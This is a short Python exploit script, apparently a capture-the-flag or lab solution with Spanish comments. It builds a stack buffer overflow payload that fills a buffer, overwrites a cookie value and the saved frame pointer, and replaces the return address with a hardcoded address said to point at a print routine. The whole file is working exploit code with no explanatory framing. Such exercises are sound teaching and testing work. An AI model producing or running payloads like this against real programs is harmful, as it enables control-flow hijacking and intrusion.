#payload.py
from struct import pack

ret_addr = 0x0804849c           #Direccion de memoria del print

output = "A" * 10               #LLena buf
output += "BBBB"                #Llena cookie
output += "CCCC"                #Lllena ebp
output += pack("<I", ret_addr)  #Establece el return address

print(output)